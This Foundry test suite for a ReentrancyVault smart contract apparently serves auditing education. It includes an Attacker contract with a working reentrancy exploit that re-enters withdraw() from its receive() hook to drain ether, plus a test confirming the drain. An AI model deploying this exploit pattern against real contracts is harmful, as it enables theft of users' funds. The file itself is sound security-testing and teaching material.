// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {ReentrancyVault} from "../src/ReentrancyVault.sol";

/**
 * @title Attacker Contract
 * @notice Exploits reentrancy vulnerability
 */
contract Attacker {
    ReentrancyVault public vault;
    address public owner;
    uint256 public attackCount;
    
    constructor(ReentrancyVault _vault) {
        vault = _vault;
        owner = msg.sender;
    }
    
    receive() external payable {
        // Reenter if vault still has balance
        if (address(vault).balance >= 1 ether && attackCount < 3) {
            attackCount++;
            vault.withdraw(1 ether);
        }
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        attackCount = 0;
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
        payable(owner).transfer(address(this).balance);
    }
}

/**
 * @title ReentrancyVaultTest
 * @notice Test suite for ReentrancyVault
 * @author Volodymyr Stetsenko (Zero2Auditor)
 */
contract ReentrancyVaultTest is Test {
    ReentrancyVault public vault;
    Attacker public attacker;
    
    address public alice = address(0x1);
    address public bob = address(0x2);
    
    function setUp() public {
        vault = new ReentrancyVault();
        attacker = new Attacker(vault);
        
        // Fund vault with 10 ETH
        vm.deal(address(vault), 10 ether);
        
        // Fund attacker with 1 ETH
        vm.deal(address(attacker), 1 ether);
        
        // Fund test accounts
        vm.deal(alice, 5 ether);
        vm.deal(bob, 5 ether);
    }
    
    /**
     * @notice Test normal deposit functionality
     */
    function test_deposit() public {
        vm.startPrank(alice);
        vault.deposit{value: 1 ether}();
        assertEq(vault.getUserBalance(alice), 1 ether);
        vm.stopPrank();
    }
    
    /**
     * @notice Test normal withdrawal functionality
     */
    function test_withdraw() public {
        vm.startPrank(alice);
        vault.deposit{value: 1 ether}();
        uint256 balanceBefore = alice.balance;
        vault.withdraw(1 ether);
        assertEq(alice.balance, balanceBefore + 1 ether);
        assertEq(vault.getUserBalance(alice), 0);
        vm.stopPrank();
    }
    
    /**
     * @notice Test reentrancy attack - SHOULD FAIL (vulnerability exists)
     */
    function test_reentrancy_attack_drains_vault() public {
        uint256 vaultBalanceBefore = address(vault).balance;
        
        // Execute attack
        vm.prank(address(attacker));
        attacker.attack{value: 1 ether}();
        
        // Vault should be drained
        assertLt(
            address(vault).balance,
            vaultBalanceBefore,
            "Vault was not drained - reentrancy protection may be in place"
        );
    }
    
    /**
     * @notice Fuzz test for deposit amounts
     */
    function testFuzz_deposit(uint256 amount) public {
        vm.assume(amount > 0 && amount <= 100 ether);
        vm.deal(alice, amount);
        
        vm.startPrank(alice);
        vault.deposit{value: amount}();
        assertEq(vault.getUserBalance(alice), amount);
        vm.stopPrank();
    }
    
    /**
     * @notice Invariant: User balance should never exceed contract balance
     */
    function invariant_user_balance_never_exceeds_contract() public {
        assertLe(
            vault.getUserBalance(alice) + vault.getUserBalance(bob),
            address(vault).balance
        );
    }
}

